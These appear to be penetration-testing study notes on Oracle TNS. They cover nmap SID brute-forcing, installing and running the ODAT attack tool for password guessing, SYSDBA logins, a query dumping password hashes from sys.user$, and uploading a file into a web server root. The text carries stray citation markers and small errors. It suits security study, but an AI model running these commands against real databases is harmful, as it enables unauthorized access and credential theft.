
# Oracle TNS & Database Reference

oracle databases, **SID** stands for **System Identifier**. It is a unique name used to identify a specific database instance running on a server.

When a client wants to connect to an Oracle database, it must specify the SID along with the connection string so the listener knows exactly which database instance to route the connection to .

## 🔍 Footprinting & Enumeration
* **Port & Service**: Oracle TNS listeners run on the default port **TCP/1521**[cite: 2].
* **SID (System Identifier)**: A unique name used to identify a specific Oracle database instance, which clients must specify alongside the connection string[cite: 2].
* **Nmap Port Scan**: 
  `sudo nmap -p1521 -sV <target_ip> -open`[cite: 2]
* **Nmap SID Brute-Forcing**: 
  `sudo nmap -p1521 -sV <target_ip> -open --script oracle-sid-brute`[cite: 2]

---
# ODAT (Oracle Database Attacking Tool) Installation Guide

## 🛠️ Setup & Installation Commands
* **Installing Dependencies & Building cx_Oracle**:

  sudo apt-get update
  sudo apt-get install -y build-essential python3-dev libaio1
  cd ~
  wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
  tar xzf cx_Oracle-8.3.0.tar.gz
  cd cx_Oracle-8.3.0
  python3 setup.py build
  sudo python3 setup.py install


* **Cloning ODAT and Installing Python Requirements**:

  cd ~
  git clone https://github.com/quentinhardy/odat.git
  cd odat/
  pip install python-libnmap
  git submodule init
  git submodule update
  sudo apt-get install python3-scapy -y
  sudo pip3 install colorlog termcolor passlib python-libnmap
  sudo apt-get install build-essential libgmp-dev -y
  pip3 install pycryptodome
  pip3 install openpyxl
  
* **Automated Enumeration & Cracking (ODAT)**: 
  * Use the `odat.py` tool to perform comprehensive scans, retrieve database versions, user accounts, and identify vulnerabilities or misconfigurations[cite: 2].
  * **Execution Example (All Modules)**: 
    `./odat.py all -s <target_ip>`
  *  `./odat.py sidguesser -s <tareget_ip>`
  * `./odat.py passwordguesser -s <target_ip> -d <sid_name>`

---

## 🛠️ Client Setup & Installation (SQL*Plus)
* **Installing SQL*Plus Client Packages**:
```shell
  sudo apt update
  sudo apt upgrade parrot-core
  sudo apt update
  sudo apt install oracle-instantclient-sqlplus
```

* **Fixing Missing Shared Libraries Error**:
```shell
  sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
  sudo ldconfig
```

  
  ---
  

## 🔌 Connecting to Oracle (SQL*Plus)
* **Standard User Connection**: 
  `sqlplus <username>/<password>@<target_ip>/<SID>`[cite: 2]
* **Administrative Connection (SYSDBA)**: 
  `sqlplus <username>/<password>@<target_ip>/<SID> as sysdba`[cite: 2]

---

## 🛠️ Exploitation & Post-Exploitation (ODAT)
* **Extracting Password Hashes (T-SQL)**: 
  `select name, password from sys.user$;`[cite: 2]
* **Arbitrary File Upload (ODAT UTL Files)**: 
  `./odat.py utlfiles <target_ip> -d <SID> -U <user> -P <password> sysdba --putFile C:\\inetpub\\wwwroot <local_file> ./<remote_file>`[cite: 2]


------------------------------------------------------------------